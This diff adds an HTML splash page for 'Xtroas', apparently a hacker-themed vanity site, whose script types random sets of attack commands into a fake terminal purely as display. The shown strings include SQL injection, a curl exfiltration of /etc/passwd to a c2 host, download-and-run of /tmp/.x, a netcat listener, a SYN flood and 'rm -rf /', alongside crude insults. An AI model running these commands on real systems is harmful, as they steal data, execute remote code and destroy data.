@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=0.85">
+    <title>Xtroas</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Creepster&family=Orbitron:wght@900&family=Roboto+Mono&display=swap');
+
+        body {
+            margin: 0;
+            padding: 0;
+            background: #142b17;
+            color: rgb(255, 0, 0);
+            font-family: 'Roboto Mono', monospace;
+            overflow: hidden;
+            height: 100vh;
+            transform: scale(0.9);
+            transform-origin: center center;
+        }
+
+        .container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 1200px;
+            text-align: center;
+        }
+
+        .logo {
+            font-family: 'Creepster', cursive;
+            font-size: 9vw;
+            color: rgb(255, 0, 0);
+            text-shadow: 
+                0 0 10px rgb(255, 0, 0),
+                0 0 20px rgb(255, 0, 0),
+                0 0 40px rgb(255, 0, 0),
+                0 0 80px rgb(136, 0, 0);
+            letter-spacing: 0.8rem;
+            white-space: nowrap;
+            overflow: hidden;
+            margin: 0 auto 2rem auto;
+            height: 1.2em;
+        }
+
+        .logo::after {
+            content: '|';
+            animation: blink 0.8s infinite;
+            color: rgb(255, 0, 0);
+        }
+
+        @keyframes glow {
+            0% { text-shadow: 0 0 10px rgb(255, 0, 0), 0 0 20px rgb(255, 0, 0), 0 0 40px rgb(255, 0, 0); }
+            100% { text-shadow: 0 0 20px rgb(255, 0, 0), 0 0 40px rgb(255, 0, 0), 0 0 80px rgb(136, 0, 0), 0 0 120px rgb(68, 0, 0); }
+        }
+
+        @keyframes blink {
+            50% { opacity: 0; }
+        }
+
+        .skull {
+            font-size: 12vw;
+            color: rgb(136, 0, 0);
+            filter: drop-shadow(0 0 30px rgb(255, 0, 0));
+            margin-bottom: 1rem;
+        }
+
+        .message {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.8vw;
+            color: rgb(255, 0, 0);
+            text-shadow: 0 0 15px rgb(255, 0, 0);
+            margin-bottom: 3rem;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; }
+            50% { opacity: 1; }
+            100% { opacity: 0.7; }
+        }
+
+        .terminal {
+            background: rgba(0, 20, 0, 0.9);
+            border: 2px solid rgb(255, 0, 0);
+            padding: 2rem;
+            box-shadow: 0 0 40px #080;
+            font-size: 1.6rem;
+            color: #0f0;
+            text-align: left;
+            margin: 0 auto;
+            width: 90%;
+            max-width: 1000px;
+        }
+
+        .terminal-line {
+            white-space: nowrap;
+            overflow: hidden;
+            margin: 0.8rem 0;
+        }
+
+        .matrix-rain {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            overflow: hidden;
+            z-index: -1;
+        }
+
+        .drop {
+            position: absolute;
+            color: #0f0;
+            font-size: 1.2rem;
+            white-space: nowrap;
+            animation: fall linear infinite;
+            opacity: 0.7;
+        }
+
+        @keyframes fall {
+            0% { transform: translateY(-100px); opacity: 0; }
+            10% { opacity: 0.7; }
+            90% { opacity: 0.7; }
+            100% { transform: translateY(100vh); opacity: 0; }
+        }
+
+        .scanlines {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.15),
+                rgba(0, 0, 0, 0.15) 1px,
+                transparent 1px,
+                transparent 2px
+            );
+            pointer-events: none;
+            animation: scan 12s linear infinite;
+            z-index: 1;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(100vh); }
+        }
+    </style>
+</head>
+<body>
+    <div class="scanlines"></div>
+    <div class="matrix-rain" id="rain"></div>
+
+    <div class="container">
+        <div class="skull">☠</div>
+        <div class="logo" id="logo"></div>
+        
+        <div class="message">
+            |- @xtroas on discord -|
+        </div>
+
+        <div class="terminal" id="terminal">
+            <!-- Lines injected by JS -->
+        </div>
+    </div>
+
+    <script>
+        // Matrix rain
+        const rainContainer = document.getElementById('rain');
+        const chars = '01010100101AIDS101001001001010BALLS1001010010001XTROAS';
+        setInterval(() => {
+            const drop = document.createElement('div');
+            drop.classList.add('drop');
+            drop.textContent = Array(Math.floor(Math.random() * 20 + 10))
+                .fill().map(() => chars[Math.floor(Math.random() * chars.length)]).join('');
+            drop.style.left = Math.random() * 100 + '%';
+            drop.style.animationDuration = (Math.random() * 6 + 6) + 's';
+            drop.style.fontSize = (Math.random() * 0.5 + 0.8) + 'rem';
+            rainContainer.appendChild(drop);
+            setTimeout(() => drop.remove(), 20000);
+        }, 150);
+
+        // Infinite looping typewriter for title
+        const logo = document.getElementById('logo');
+        const titleText = 'XTROAS.XYZ';
+        let i = 0;
+        let direction = 1; // 1 = typing, -1 = deleting
+
+        function typeLoop() {
+            if (direction === 1) {
+                // Typing forward
+                if (i < titleText.length) {
+                    logo.textContent = titleText.substring(0, i + 1);
+                    i++;
+                } else {
+                    setTimeout(() => { direction = -1; typeLoop(); }, 2000); // Pause at end
+                    return;
+                }
+            } else {
+                // Deleting backward
+                if (i > 0) {
+                    logo.textContent = titleText.substring(0, i);
+                    i--;
+                } else {
+                    direction = 1;
+                }
+            }
+            setTimeout(typeLoop, 150);
+        }
+
+        setTimeout(typeLoop, 500);
+
+        // Fake advanced command sets (SQL, network, system breaches)
+        const commandSets = [
+            ["SELECT * FROM users WHERE 1=1; --", "DUMPING user_credentials...", "INSERT INTO backdoors (payload) VALUES ('dumbass');", "TRUNCATE TABLE sessions;", "GRANT ALL PRIVILEGES ON *.* TO 'xtroas'@'%';"],
+            ["nmap -sS -p- -T4 192.168.0.0/16", "Scanning internal network...", "arp -a | grep spoof", "nc -lvp 4444 &", "ssh -o StrictHostKeyChecking=no root@*"],
+            ["DROP DATABASE production;", "Exfiltrating credit_cards table...", "UPDATE payments SET amount=0 WHERE user_id>0;", "ALTER TABLE admins ADD COLUMN owned TINYINT DEFAULT 1;", "REVOKE ALL PRIVILEGES FROM legitimate_users_whith_aids;"],
+            ["iptables -I INPUT -s 0.0.0.0/0 -j ACCEPT", "Opening reverse shell on 1337...", "curl -X POST http://c2.xtroas.xyz/exfil --data-binary @/etc/passwd", "wget http://xtroas.xyz/aids -O /tmp/.x", "chmod +x /tmp/.x && /tmp/.x &"],
+            ["SHOW TABLES FROM wordpress;", "Dumping wp_users hashed passwords...", "INSERT INTO wp_posts (post_title) VALUES ('XTROAS WAS HERE');", "DELETE FROM balls WHERE status='rooted';", "FLUSH PRIVILEGES && DEEZNUTS;"],
+            ["traceroute -m 30 xtroas.xyz", "Routing through TOR nodes...", "hping3 --flood -S target_ip", "ethtool -K eth0 tx off rx off", "sudo rm -rf/ --no-preserve-root"],
+            ["UNION SELECT username,password FROM dumbass.user;", "Escalating to DBA...", "CREATE PROCEDURE rootkit() BEGIN FROUNTDOOR;", "CALL bigaids();", "DROP PROCEDURE IF EXISTS security;"]
+        ];
+
+        // Random set on each load
+        const randomSet = commandSets[Math.floor(Math.random() * commandSets.length)];
+        const terminal = document.getElementById('terminal');
+
+        randomSet.forEach((cmd, index) => {
+            const line = document.createElement('div');
+            line.className = 'terminal-line';
+            line.textContent = cmd;
+            line.style.width = '0';
+            line.style.animation = `typing ${cmd.length * 0.08 + 1}s steps(${cmd.length}) ${index * 4 + 2}s forwards`;
+            terminal.appendChild(line);
+        });
+
+        // Add blinking cursor to last line only during typing
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes typing { from { width: 0; } to { width: 100%; } }
+            .terminal-line:last-child { 
+                border-right: 0.15em solid #0f0; 
+                animation: typing ${randomSet[randomSet.length-1].length * 0.08 + 1}s steps(${randomSet[randomSet.length-1].length}) ${randomSet.length * 4}s forwards,
+                           blink 0.8s ${randomSet.length * 4 + 2}s infinite;
+            }
+        `;
+        document.head.appendChild(style);
+    </script>
+</body>
+</html>
